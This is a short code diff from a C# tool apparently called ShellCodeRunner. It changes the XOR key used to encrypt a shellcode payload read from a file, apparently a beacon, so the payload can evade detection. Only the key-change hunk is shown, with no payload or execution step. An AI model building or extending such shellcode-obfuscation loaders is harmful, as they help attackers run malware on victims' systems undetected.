@@ -41,7 +41,7 @@ namespace ShellCodeRunner
             byte[] uncShell = File.ReadAllBytes(bcnPath);
 
             // Encryption key.  Change this to whatever you want
-            char[] arryKey = { 'p', 'a', 's', 's', 'k', 'e', 'y' };
+            char[] arryKey = { 'j', 'i', 'm', 'm', 'y', '9', '4', '7', '7', '8', '8' };
 
             // Call the XOR encryption function on the payload with the encryption key
             byte [] payLoad = encrypt(uncShell, arryKey);
